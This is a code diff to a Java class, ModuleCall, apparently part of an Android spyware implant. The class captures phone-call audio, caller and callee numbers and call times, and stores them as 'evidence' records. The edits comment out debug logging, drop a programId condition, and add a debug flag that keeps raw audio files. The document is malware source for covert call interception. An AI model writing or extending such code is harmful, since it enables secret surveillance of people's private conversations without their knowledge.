@@ -469,8 +469,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	private boolean saveCallEvidence(String peer, String myNumber, boolean incoming, Date dateBegin, Date dateEnd,
 			String currentRecordFile, boolean autoClose, int channel, int programId) {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (saveCallEvidence): " + currentRecordFile + " peer: " + peer + " from: " + dateBegin
-					+ " to: " + dateEnd + " incoming: " + incoming);
+			//Check.log(TAG + " (saveCallEvidence): " + currentRecordFile + " peer: " + peer + " from: " + dateBegin
+			//		+ " to: " + dateEnd + " incoming: " + incoming);
 		}
 
 		final byte[] additionaldata = getCallAdditionalData(peer, myNumber, incoming, new DateTime(dateBegin),
@@ -479,7 +479,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		AutoFile file = new AutoFile(currentRecordFile);
 		if (file.exists() && file.getSize() > HEADER_SIZE && file.canRead()) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (saveCallEvidence): file size = " + file.getSize());
+				//Check.log(TAG + " (saveCallEvidence): file size = " + file.getSize());
 			}
 
 			int offset = 0;
@@ -487,7 +487,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 			if (ByteArray.equals(header, 0, AMR_HEADER, 0, AMR_HEADER.length)) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (saveCallEvidence): AMR header");
+					//Check.log(TAG + " (saveCallEvidence): AMR header");
 				}
 				offset = AMR_HEADER.length;
 			}
@@ -500,8 +500,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			}
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (saveCallEvidence), data len: " + data.length + " pos: " + pos);
-				Check.log(TAG + " (saveCallEvidence), data[0:6]: " + ByteArray.byteArrayToHex(data).substring(0, 20));
+				//Check.log(TAG + " (saveCallEvidence), data len: " + data.length + " pos: " + pos);
+				//Check.log(TAG + " (saveCallEvidence), data[0:6]: " + ByteArray.byteArrayToHex(data).substring(0, 20));
 			}
 
 			EvidenceReference.atomic(EvidenceType.CALL, additionaldata, data);
@@ -550,10 +550,6 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			pos += chunklen + 1;
 		}
 
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (checkIntegrity): end");
-		}
-
 		return pos;
 	}
 
@@ -598,8 +594,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		additionalData.write(callee);
 
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (getCallAdditionalData) caller: %s callee: %s", caller.length, callee.length);
-			Check.log(TAG + " getPosition: %s, len: %s ", additionalData.getPosition(), len);
+			//Check.log(TAG + " (getCallAdditionalData) caller: %s callee: %s", caller.length, callee.length);
+			//Check.log(TAG + " getPosition: %s, len: %s ", additionalData.getPosition(), len);
 		}
 
 		if (Cfg.DEBUG) {
@@ -1008,8 +1004,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (encodeChunks) finished: [" + finished[0] + "," + finished[1] + "]" );
 				}
-
-				if ( (finished[0] && finished[1]) || callInfo.programId == 0x0148  ) {
+				// || callInfo.programId == 0x0148  
+				if ( (finished[0] && finished[1]) ) {
 					// After encoding create the end of call marker
 					if (callInfo.delay) {
 						saveAllEvidences(chunks, begin, end);
@@ -1033,9 +1029,9 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + "(encodeChunks): deleting " + f);
 		}
-
-		audioEncoder.removeRawFile();
-
+		if(!Cfg.DEBUG_AUDIO){
+			audioEncoder.removeRawFile();
+		}
 	}
 
 	private void sort_chunks() {
